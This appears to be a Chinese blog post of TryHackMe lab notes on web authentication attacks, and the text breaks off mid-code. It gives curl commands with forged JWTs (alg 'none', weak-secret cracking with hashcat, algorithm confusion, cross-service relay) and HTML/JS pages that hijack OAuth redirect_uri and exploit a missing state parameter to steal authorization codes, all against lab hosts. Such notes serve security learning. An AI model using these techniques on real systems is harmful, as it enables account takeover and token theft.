<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>[THM]Web Application Pentesting---Authentication  认证 | lan1ocのblog</title><meta name="author" content="lan1oc"><meta name="copyright" content="lan1oc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="基础sessioncookie属性Secure - 向浏览器指示 Cookie 只能通过经过验证的 HTTPS 通道传输。如果存在证书错误或使用 HTTP，则不会传输 Cookie 值HTTPOnly - 向浏览器指示客户端 JavaScript 可能无法读取 Cookie 值Expire - 向浏览器指示 Cookie 值何时不再有效，应将其删除SameSite - 向浏览器指示是否可以在跨站点">
<meta property="og:type" content="article">
<meta property="og:title" content="[THM]Web Application Pentesting---Authentication  认证">
<meta property="og:url" content="http://lan1oc.co/2025/05/28/THM/[THM]Web%20Application%20Pentesting---Authentication%20%E8%AE%A4%E8%AF%81/index.html">
<meta property="og:site_name" content="lan1ocのblog">
<meta property="og:description" content="基础sessioncookie属性Secure - 向浏览器指示 Cookie 只能通过经过验证的 HTTPS 通道传输。如果存在证书错误或使用 HTTP，则不会传输 Cookie 值HTTPOnly - 向浏览器指示客户端 JavaScript 可能无法读取 Cookie 值Expire - 向浏览器指示 Cookie 值何时不再有效，应将其删除SameSite - 向浏览器指示是否可以在跨站点">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://lan1oc.co/img/cover/4.webp">
<meta property="article:published_time" content="2025-05-28T08:00:00.000Z">
<meta property="article:modified_time" content="2025-06-13T08:00:00.000Z">
<meta property="article:author" content="lan1oc">
<meta property="article:tag" content="THM记录">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://lan1oc.co/img/cover/4.webp"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "[THM]Web Application Pentesting---Authentication  认证",
  "url": "http://lan1oc.co/2025/05/28/THM/[THM]Web%20Application%20Pentesting---Authentication%20%E8%AE%A4%E8%AF%81/",
  "image": "http://lan1oc.co/img/cover/4.webp",
  "datePublished": "2025-05-28T08:00:00.000Z",
  "dateModified": "2025-06-13T08:00:00.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "lan1oc",
      "url": "http://lan1oc.co/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/1.ico"><link rel="canonical" href="http://lan1oc.co/2025/05/28/THM/[THM]Web%20Application%20Pentesting---Authentication%20%E8%AE%A4%E8%AF%81/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: true,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '[THM]Web Application Pentesting---Authentication  认证',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/4.webp);"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/cover/4.webp);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">lan1ocのblog</span></a><a class="nav-page-title" href="/"><span class="site-name">[THM]Web Application Pentesting---Authentication  认证</span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">[THM]Web Application Pentesting---Authentication  认证</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-05-28T08:00:00.000Z" title="发表于 2025-05-28 16:00:00">2025-05-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-13T08:00:00.000Z" title="更新于 2025-06-13 16:00:00">2025-06-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0/">学习</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><h4 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h4><p><strong>Secure</strong> - 向浏览器指示 Cookie 只能通过经过验证的 HTTPS 通道传输。如果存在证书错误或使用 HTTP，则不会传输 Cookie 值<br><strong>HTTPOnly</strong> - 向浏览器指示客户端 JavaScript 可能无法读取 Cookie 值<br><strong>Expire</strong> - 向浏览器指示 Cookie 值何时不再有效，应将其删除<br><strong>SameSite</strong> - 向浏览器指示是否可以在跨站点请求中传输 Cookie，以帮助防止 CSRF 攻击</p>
<h3 id="token"><a href="#token" class="headerlink" title="token"></a>token</h3><h4 id="Token-Based-Session-Management"><a href="#Token-Based-Session-Management" class="headerlink" title="Token-Based Session Management"></a>Token-Based Session Management</h4><p>最常见的令牌类型之一是 JSON Web 令牌 （JWT），一般形式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Bearer &lt;token&gt;</span><br></pre></td></tr></table></figure>

<h3 id="以前的盲点"><a href="#以前的盲点" class="headerlink" title="以前的盲点"></a>以前的盲点</h3><p>浏览器中不仅仅要注意cookie，还要注意本地存储的<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250530113843.png"></p>
<h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><p>它没有使用浏览器的自动 cookie 管理功能，而是依赖于客户端代码来完成该过程。身份验证后，Web 应用程序会在请求正文中提供令牌。然后使用客户端 JavaScript 代码，此令牌将存储在浏览器的 LocalStorage 中</p>
<h2 id="在线工具"><a href="#在线工具" class="headerlink" title="在线工具"></a><a target="_blank" rel="noopener" href="https://jwt.io/">在线工具</a></h2><h3 id="curl命令使用"><a href="#curl命令使用" class="headerlink" title="curl命令使用"></a>curl命令使用</h3><p>拿token</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &#x27;Content-Type: application/json&#x27; -X POST -d &#x27;&#123; &quot;username&quot; : &quot;user&quot;, &quot;password&quot; : &quot;password2&quot; &#125;&#x27; http://10.10.95.235/api/v1.0/example2</span><br></pre></td></tr></table></figure>

<p><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250530135953.png"><br>验证用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.q8De2tfygNpldMvn581XHEbVzobCkoO1xXY4xRHcdJ8&#x27; http://10.10.95.235/api/v1.0/example2?username=user</span><br></pre></td></tr></table></figure>

<h2 id="未验证"><a href="#未验证" class="headerlink" title="未验证"></a>未验证</h2><p><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250530140043.png"><br>重新构造，把admin的值设为1<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250530140536.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.q8De2tfygNpldMvn581XHEbVzobCkoO1xXY4xRHcdJ8&#x27; http://10.10.95.235/api/v1.0/example2?username=admin</span><br></pre></td></tr></table></figure>

<p><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250530140731.png"></p>
<h2 id="签名算法降级为none"><a href="#签名算法降级为none" class="headerlink" title="签名算法降级为none"></a>签名算法降级为none</h2><p>构造时，alg那里是设置签名算法的，改为none，只能分段手动改了<br>拿到的token</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0._yybkWiZVAe1djUIE9CRa0wQslkRmLODBPNsjsY8FO8</span><br></pre></td></tr></table></figure>

<p>按.分割，分别base64解码再构造再解码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0=</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0=</span><br></pre></td></tr></table></figure>

<p>最后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0=.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0=._yybkWiZVAe1djUIE9CRa0wQslkRmLODBPNsjsY8FO8&#x27; http://10.10.95.235/api/v1.0/example3?username=admin</span><br></pre></td></tr></table></figure>

<p><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250530150511.png"></p>
<h2 id="弱对称密钥签名"><a href="#弱对称密钥签名" class="headerlink" title="弱对称密钥签名"></a>弱对称密钥签名</h2><p>直接hashcat破解</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 16500 -a 0 &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.yN1f3Rq8b26KEUYHCZbEwEk6LVzRYtbGzJMFIF8i5HY&quot; fuzzDicts-master/jwt.secrets.list</span><br></pre></td></tr></table></figure>

<p><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250530151202.png"></p>
<h2 id="签名算法混淆"><a href="#签名算法混淆" class="headerlink" title="签名算法混淆"></a>签名算法混淆</h2><p>特别发生在对称签名算法和非对称签名算法之间的混淆中。如果使用非对称签名算法（例如 RS256），则可以将算法降级为 HS256。在这些情况下，某些库将默认使用公钥作为对称签名算法的密钥。由于公钥是已知的，因此可以将 HS256 算法与公钥结合使用来伪造有效的签名</p>
<p>已修复，就不用脚本不复现了<br>先获取token和公钥<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250530160452.png"><br>直接jwt.io构造<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250530160515.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.7jJBvWpF9JT4DdeUWnl0o7imBV0wa0HTDPRMavGbPyU&#x27; http://10.10.95.235/api/v1.0/example5?username=admin</span><br></pre></td></tr></table></figure>

<p><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250530160533.png"></p>
<h2 id="令牌不过期"><a href="#令牌不过期" class="headerlink" title="令牌不过期"></a>令牌不过期</h2><p>解密token<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250530160817.png"><br>未显示<code>exp</code>值，代表令牌不过期</p>
<h2 id="跨服务中继攻击"><a href="#跨服务中继攻击" class="headerlink" title="跨服务中继攻击"></a>跨服务中继攻击</h2><p>一个用户在appA普通权限，在appB是管理员权限，那就用appB的token去请求appA</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MSwiYXVkIjoiYXBwQiJ9.jrTcVTGY9VIo-a-tYq_hvRTfnB4dMi_7j98Xvm-xb6o&#x27; http://10.10.95.235/api/v1.0/example7_appA?username=admin</span><br></pre></td></tr></table></figure>

<p><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250530162124.png"></p>
<h1 id="OAuth-漏洞-OAuth-2-0，即常用的授权框架"><a href="#OAuth-漏洞-OAuth-2-0，即常用的授权框架" class="headerlink" title="OAuth 漏洞(OAuth 2.0，即常用的授权框架)"></a>OAuth 漏洞(OAuth 2.0，即常用的授权框架)</h1><p>应用程序使用 OAuth 的第一个迹象通常在登录过程中找到。查找允许用户使用 Google、Facebook 和 GitHub 等外部服务提供商登录的选项。这些选项通常会将用户重定向到服务提供商的授权页面，这强烈表明 OAuth 正在使用中</p>
<h2 id="一些基本概念"><a href="#一些基本概念" class="headerlink" title="一些基本概念"></a>一些基本概念</h2><h3 id="状态参数"><a href="#状态参数" class="headerlink" title="状态参数"></a>状态参数</h3><p>可选参数维护客户端和授权服务器之间的状态。它可以通过确保响应与客户端的请求匹配来帮助防止 CSRF 攻击。状态参数是保护 OAuth 流的关键部分</p>
<h3 id="授权类型（服务器-服务器交互常用的授权类型是客户端凭证授予）"><a href="#授权类型（服务器-服务器交互常用的授权类型是客户端凭证授予）" class="headerlink" title="授权类型（服务器-服务器交互常用的授权类型是客户端凭证授予）"></a>授权类型（服务器-服务器交互常用的授权类型是客户端凭证授予）</h3><h4 id="授权码授予"><a href="#授权码授予" class="headerlink" title="授权码授予"></a>授权码授予</h4><p>最常用的 OAuth 2.0 流程，适用于服务器端应用程序（PHP、JAVA、.NET 等）<br>流程：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">客户端将用户重定向到授权服务器，用户将在其中进行身份验证并授予授权。然后，授权服务器使用授权码将用户重定向到客户端。客户端通过请求授权服务器的令牌终端节点来交换访问令牌的授权代码</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这种授权类型以其增强的安全性而闻名，因为授权码是<strong>服务器到服务器交换的访问令牌，这意味着访问令牌不会暴露给用户代理（例如浏览器）</strong> ，从而降低了令牌泄漏的风险。它还支持使用刷新令牌来保持长期访问，而无需重复用户身份验证</p>
<h4 id="隐式授权"><a href="#隐式授权" class="headerlink" title="隐式授权"></a>隐式授权</h4><p>主要适用于客户端无法安全存储密钥的移动和 Web 应用程序。它<strong>直接向客户端颁发访问令牌，而无需交换授权代码</strong><br>在此流程中，客户端将用户重定向到授权服务器。在用户进行身份验证并授予授权后，授权服务器会在 <strong>URL 片段中</strong> 返回一个访问令牌<br>此授权类型经过简化，适用于无法安全存储客户端密钥的客户端。它更快，因为它涉及的步骤比授权码授予少。但是，它不太安全，因为<strong>访问令牌会暴露给用户代理，并且可以记录在浏览器历史记录中</strong> 。它也<strong>不支持刷新令牌</strong></p>
<h4 id="资源所有者密码凭证授予"><a href="#资源所有者密码凭证授予" class="headerlink" title="资源所有者密码凭证授予"></a>资源所有者密码凭证授予</h4><p>当资源<strong>所有者高度信任</strong> 客户端（例如第一方应用程序）时，将使用 Resource Owner Password Credentials 授予。客户端直接收集用户的凭证（用户名和密码），并将其交换为访问令牌</p>
<h5 id="客户端凭证授予"><a href="#客户端凭证授予" class="headerlink" title="客户端凭证授予"></a>客户端凭证授予</h5><p>用于服务器到服务器的交互，无需用户参与。客户端使用其凭证向授权服务器进行身份验证并获取访问令牌。在此流程中，<strong>客户端使用其客户端凭证（客户端 ID 和密钥）向授权服务器进行身份验证，授权服务器直接向客户端颁发访问令牌</strong><br>此授权类型适用于后端服务和服务器到服务器通信，因为它不涉及用户凭证，从而降低了与用户数据泄露相关的安全风险</p>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="窃取-OAuth-令牌"><a href="#窃取-OAuth-令牌" class="headerlink" title="窃取 OAuth 令牌"></a>窃取 OAuth 令牌</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>攻击者获得了对 <code>redirect_uri</code> 中列出的任何域或 URI 的控制权，他们就可以纵流来拦截令牌<br>如果攻击者获得了对 <code>demo.com</code> 的控制权，他们就可以利用 OAuth 流。通过将 <code>redirect_uri</code> 设置为 <code>http://demo.com/callback</code> ，授权服务器会将令牌发送到此受控域<br>攻击者启动 OAuth 流并确保 <code>redirect_uri</code> 指向其受控域。用户授权应用程序后，令牌将发送到 <code>http://demo.com/callback</code> 。攻击者现在可以捕获此令牌并使用它来访问受保护的资源</p>
<h4 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h4><p>准备一个恶意授权请求的页面，可以用以下示例代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://coffee.thm:8000/oauthdemo/oauth_login/&quot; method=&quot;get&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;redirect_uri&quot; value=&quot;http://dev.bistro.thm:8002/malicious_redirect.html&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;Hijack OAuth&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>此表单发送一个带有 value <code>http://dev.bistro.thm:8002/malicious_redirect.html</code> 的隐藏 <code>redirect_uri</code> 参数，并向<code>http://coffee.thm:8000/oauthdemo/oauth_login/</code>提交请求<br><code>malicious_redirect.html</code> 页面使用以下代码拦截来自 URL 的授权代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    // 从 URL 中提取授权码</span><br><span class="line">    const urlParams = new URLSearchParams(window.location.search);</span><br><span class="line">    const code = urlParams.get(&#x27;code&#x27;);</span><br><span class="line"></span><br><span class="line">    // 将授权码显示在页面上</span><br><span class="line">    document.getElementById(&#x27;auth_code&#x27;).innerText = code;</span><br><span class="line"></span><br><span class="line">    // 在控制台打印截获的授权码</span><br><span class="line">    console.log(&quot;截获的授权码:&quot;, code);</span><br><span class="line"></span><br><span class="line">    // 此处可以添加代码，将获取到的授权码保存到数据库或文件中</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong> ：由于攻击者对子域拥有完全控制权，因此一旦他将受害者重定向到攻击者控制的域，他就会将凭据保存在数据库&#x2F;文件等中，以备后用。此外，从 redirect_uri 重定向到原始 URL 的速度非常快，以至于受害者不知道他的授权码已被劫持</p>
<p>我们可以诱导受害者点击受控域<code>http://dev.bistro.thm:8002/redirect_uri.html</code><br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250608155906.png"><br>然后点击<code>Login via OAuth</code>按钮，表单会调用 <code>http://coffee.thm:8000/oauthdemo/oauth_login/</code> 但带有伪造的 <code>redirect_uri</code>，一旦受害者输入 OAuth 提供程序的凭据 （<code>victim：victim123</code>），它就会将 OAuth 授权代码定向到攻击者的受控 URL （ <code>http://dev.bistro.thm:8002/malicious_redirect.html</code> ）<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250608160535.png"><br>然后可以利用拦截的授权码调用 <code>/callback</code> 端点并将其交换为有效的访问令牌</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bistro.thm:8000/oauthdemo/callbackforflag/?code=xxxxx</span><br></pre></td></tr></table></figure>

<p><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250608160728.png"></p>
<h3 id="OAuth-中的-CSRF"><a href="#OAuth-中的-CSRF" class="headerlink" title="OAuth 中的 CSRF"></a>OAuth 中的 CSRF</h3><h4 id="原理（缺少-state-参数的csrf）"><a href="#原理（缺少-state-参数的csrf）" class="headerlink" title="原理（缺少 state 参数的csrf）"></a>原理（缺少 state 参数的csrf）</h4><p>如果没有 <code>state</code> 参数，授权过程很容易受到 CSRF 的攻击。攻击者可以通过获取受害者的授权码并将其发送给攻击者来利用此漏洞。授权服务器无法确定授权代码是属于<strong>攻击者</strong> 还是<strong>受害者</strong> ，或者请求是来自攻击者还是受害者</p>
<h4 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h4><p>OAuth 2.0 框架中的 <strong>state</strong> 参数可防止 CSRF 攻击<br>所以要实现OAuth 中的 CSRF，其中 state 参数<strong>要么缺失</strong> ，要么<strong>是可预测的</strong> （例如，像 “state” 这样的静态值或一个简单的序列号）。攻击者可以启动 OAuth 流并提供其恶意重定向 URI。在用户对应用程序进行身份验证并授权后，授权服务器会将授权代码重定向到攻击者的受控 URI</p>
<h4 id="实操（缺少-state-参数）"><a href="#实操（缺少-state-参数）" class="headerlink" title="实操（缺少 state 参数）"></a>实操（缺少 state 参数）</h4><h5 id="检查url参数"><a href="#检查url参数" class="headerlink" title="检查url参数"></a>检查url参数</h5><p>登录环境后看到可以将联系人同步到 <code>CoffeeShopApp</code><br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250608173041.png"><br>点击同步后发现被重定向到<code>http://coffee.thm:8000/o/authorize/?response_type=code&amp;client_id=kwoy5pKgHOn0bJPNYuPdUL2du8aboMX1n9h9C0PN&amp;redirect_uri=http%3A%2F%2Fmycontacts.thm%3A8080%2Fcsrf%2Fcallbackcsrf.php</code><br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250608173325.png"><br>注意到授权 URL 缺少 state 参数，这表明可以对 CSRF 攻击使用相同的请求</p>
<h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>首先要获取授权码，本练习中直接通过一个恶意uri<code>http://coffee.thm:8000/oauthdemo/callbackforcsrf/</code>,允许在不完成 OAuth 流程的情况下获取授权码，这个路由的代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">def oauth_logincsrf(request):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    处理 OAuth 登录请求，并构建授权 URL。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    app = Application.objects.get(name=&quot;ContactApp&quot;)</span><br><span class="line">    </span><br><span class="line">    redirect_uri = request.POST.get(</span><br><span class="line">        &quot;redirect_uri&quot;, &quot;http://coffee.thm/csrf/callbackcsrf.php&quot;</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    # 构建包含客户端 ID 和重定向 URI 的授权 URL</span><br><span class="line">    authorization_url = (</span><br><span class="line">        f&quot;http://coffee.thm:8000/o/authorize/?&quot;</span><br><span class="line">        f&quot;client_id=&#123;app.client_id&#125;&amp;&quot;</span><br><span class="line">        f&quot;response_type=code&amp;&quot;</span><br><span class="line">        f&quot;redirect_uri=&#123;redirect_uri&#125;&quot;</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    return redirect(authorization_url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def oauth_callbackflagcsrf(request):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    处理从 OAuth 提供者返回的回调请求，并提取授权码。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    code = request.GET.get(&quot;code&quot;)</span><br><span class="line"></span><br><span class="line">    # 如果请求中没有 &#x27;code&#x27; 参数，则返回错误</span><br><span class="line">    if not code:</span><br><span class="line">        return JsonResponse(</span><br><span class="line">            &#123;&#x27;error&#x27;: &#x27;missing_code&#x27;, &#x27;details&#x27;: &#x27;Missing code parameter.&#x27;&#125;,</span><br><span class="line">            status=400</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    # 如果成功获取到 &#x27;code&#x27;，将其包含在 JSON 响应中返回</span><br><span class="line">    # 注意：原始代码在这里是 if code:，在逻辑上是多余的，但予以保留。</span><br><span class="line">    # 原始代码的 status 也是 400，通常成功应为 200，这里也按原样保留。</span><br><span class="line">    if code:</span><br><span class="line">        return JsonResponse(</span><br><span class="line">            &#123;</span><br><span class="line">                &#x27;code&#x27;: code,</span><br><span class="line">                &#x27;Payload&#x27;: &#x27;http://coffee.thm/csrf/callbackcsrf.php?code=&#x27; + code</span><br><span class="line">            &#125;,</span><br><span class="line">            status=400</span><br><span class="line">        